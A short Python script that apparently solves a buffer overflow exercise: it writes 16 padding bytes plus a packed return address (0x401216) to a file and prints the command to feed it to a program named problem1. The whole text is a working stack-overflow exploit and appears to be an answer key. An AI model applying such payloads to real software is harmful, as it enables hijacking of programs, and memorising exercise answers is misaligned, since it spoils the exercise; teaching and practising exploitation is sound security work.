import struct
padding = b'A' * 16
target_address = struct.pack('<Q', 0x401216)
payload = padding + target_address
with open("ans1.txt", "wb") as f:
    f.write(payload)
print(f"Payload created! Size: {len(payload)} bytes.")
print("Run: ./problem1 ans1.txt")